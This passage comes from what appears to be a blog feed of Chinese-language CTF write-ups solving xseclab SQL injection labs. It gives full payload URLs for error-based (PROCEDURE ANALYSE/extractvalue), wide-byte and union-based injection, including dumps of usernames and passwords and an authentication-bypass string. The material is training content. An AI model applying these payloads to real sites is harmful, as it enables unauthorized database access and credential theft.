class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">[<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">[<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">[<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">[<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">select_expr [, select_expr ...]</span><br><span class="line">[<span class="keyword">FROM</span> table_references</span><br><span class="line">[<span class="keyword">WHERE</span> where_condition]</span><br><span class="line"> [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line"> [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">[<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">    [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line"> [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options</span><br><span class="line">     | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br><span class="line">     | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line"> [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure></blockquote><p>limit 关键字后面还有<em>PROCEDURE</em>和<em>INTO</em>关键字，<em>INTO</em>关键字可以用来写文件，</p><p>而<em>PROCEDURE</em> 关键字是这里的重点。MYSQL默认可用的存储过程只有<em>ANALYSE</em></p><p>我们在这里可以尝试用这个存储过程和报错回显注入：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit N,1))),1)%23&amp;num=1</a></p><p>使N从0开始递增，N=0和N=1时发现暴出表名<code>atricle</code> 和<code>user</code> ：</p><p><img src="/img/sql-ts-4.png" alt="sql-ts-4.png"></p><p><img src="/img/sql-ts-5.png" alt="sql-ts-5.png"></p><p>接着开始暴列名：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=表名的十六进制 limit N,1))),1)%23&amp;num=1</a></p><p>得到<strong>article表</strong>中的字段：id、title、contents、isread。<strong>user表</strong>中的字段：id、username、password、lastloginIP。</p><p>最后暴出数据：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,id,0x7e,username,0x7e,password) from user limit 2,1))),1)%23&amp;num=1</a></p><p><img src="/img/sql-ts-6.png" alt="sql-ts-6.png"></p><p>得到flag。</p><h2 id="题三：邂逅（图片型宽字节注入）"><a href="#题三：邂逅（图片型宽字节注入）" class="headerlink" title="题三：邂逅（图片型宽字节注入）"></a>题三：邂逅（<strong>图片型宽字节注入</strong>）</h2><p>小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。<br>题目出自：<a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入页面后显示：</p><p><img src="/img/sql-ts-7.png" alt="sql-ts-7.png"></p><p>F12得到一些信息：</p><p><img src="/img/sql-ts-8.png" alt="sql-ts-8.png"></p><p>在网址后面加<code>images/dog1.jpg?id=1%df%27</code> ：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27</a></p><p><img src="/img/sql-ts-9.png" alt="sql-ts-9.png"></p><p>发现注入点，然后开始注入。</p><p><strong>方法一：</strong></p><p>直接构造如下网址 :</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 or 1=1 %23</a></p><p>得到原始网站，则可以猜测一次输出一个数据，然后使用<strong>limit</strong> 来暴出flag:</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 or 1=1 limit 2,1 %23</a></p><p><img src="/img/sql-ts-10.png" alt="sql-ts-10.png"></p><p>得到flag。</p><p><strong>方法二：</strong></p><p>猜解SQL查询语句的字段数：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 order by N %23</a></p><p><img src="/img/sql-ts-11.png" alt="sql-ts-11.png"></p><p>得到SQL查询语句的字段数为 4。然后确定显示的字段位置：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,3,4%23</a></p><p><img src="/img/sql-ts-12.png" alt="sql-ts-12.png"></p><p>得到显示位为3。然后开始暴表名：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()%23</a></p><p><img src="/img/sql-ts-13.png" alt="sql-ts-13.png"></p><p>得到表名：<code>article</code> 和<code>pic</code> 。然后开始暴字段名：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=表名的十六进制%23</a></p><p><img src="/img/sql-ts-14.png" alt="sql-ts-14.png"></p><p>得到<code>pic</code>表的字段名为：<code>id,picname,data,text</code>，然后开始暴数据：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(picname),4 from pic%23</a></p><p><img src="/img/sql-ts-15.png" alt="sql-ts-15.png"></p><p>得到flag的图片名字<code>flagishere_askldjfklasjdfl.jpg</code> ，然后访问图片文件：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/flagishere_askldjfklasjdfl.jpg</a></p><p><img src="/img/sql-ts-10.png" alt="sql-ts-10.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之可联合查询注入</title>
    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%AF%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之可联合查询注入/</id>
    <published>2018-01-20T13:51:44.000Z</published>
    <updated>2018-01-23T07:52:06.997Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：最简单的SQL注入"><a href="#题一：最简单的SQL注入" class="headerlink" title="题一：最简单的SQL注入"></a>题一：最简单的SQL注入</h2><p>题目来自：<a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-fmz-1.png" alt="sql-fmz-1.png"></p><p>查看源码得：</p><p><img src="/img/sql-fmz-2.png" alt="sql-fmz-2.png"></p><p>然后我们在网址后面加上<code>?id=1</code> 发现页面没有什么变化，这时我们可以改变id的值，在id=3时得到了一个小信息：flag就在这个表中，然后就可以开始注入了。</p><p>在网址后面加单引号，使之变为：</p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1’</a></p><p>然后发现页面报错，存在注入点：</p><p><img src="/img/sql-fmz-3.png" alt="sql-fmz-3.png"></p><p>经<code>id=1 and 1=1</code> 、<code>id=1 and 1=2</code> 判断注入为数字型。</p><p><strong>方法一：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 or 1=1</a></p><p>暴出全部数据，得到flag：</p><p><img src="/img/sql-fmz-4.png" alt="sql-fmz-4.png"></p><p><strong>方法二：</strong></p><p><code>order by</code> 或者<code>union select 1,2,3...</code> <strong>猜解SQL查询语句中的字段数</strong>：</p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 order by N</a></p><p>N从1开始逐渐增大，判断SQL查询语句的字段数为3。</p><p><strong>确定字段显示位置：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,3</a></p><p><img src="/img/sql-fmz-5.png" alt="sql-fmz-5.png"></p><p><strong>暴出表名：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</a></p><p>得到表名：</p><p><img src="/img/sql-fmz-6.png" alt="sql-fmz-6.png"></p><p><strong>暴出列名：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’sae_user_sqli3’</a></p><p>得到列名：</p><p><img src="/img/sql-fmz-7.png" alt="sql-fmz-7.png"></p><p><strong>暴出数据：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(id,0x3a,title,0x3a,content) from sae_user_sqli3</a></p><p><img src="/img/sql-fmz-8.png" alt="sql-fmz-8.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之万能密码</title>
    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之万能密码/</id>
    <published>2018-01-20T13:14:14.000Z</published>
    <updated>2018-01-23T07:53:30.052Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：最简单的SQL注入"><a href="#题一：最简单的SQL注入" class="headerlink" title="题一：最简单的SQL注入"></a>题一：最简单的SQL注入</h2><p><strong>Tips:</strong>题目里有简单提示</p><p>题目来自：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-wn-1.png" alt="sql-wn-1.png"></p><p>然后我们F12查看一下网页源码得到信息：</p><p><img src="/img/sql-wn-2.png" alt="sql-wn-2.png"></p><p>然后就开始我们的注入吧，先猜测一下后台的SQL语句为：</p><p><code>select username,password from users where username=&#39;用户名&#39; and password=&#39;密码&#39;</code></p><p>所以可以构造语句为：<code>admin&#39; #</code></p><p><img src="/img/sql-wn-3.png" alt="sql-wn-3.png"></p><p>登录提示用户名和密码不能为空：</p><p><img src="/img/sql-wn-4.png" alt="sql-wn-4.png"></p><p>所以就随便输入几个字符，然后再次登录成功得到<strong>flag</strong>：</p><p><img src="/img/sql-wn-5.png" alt="sql-wn-5.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
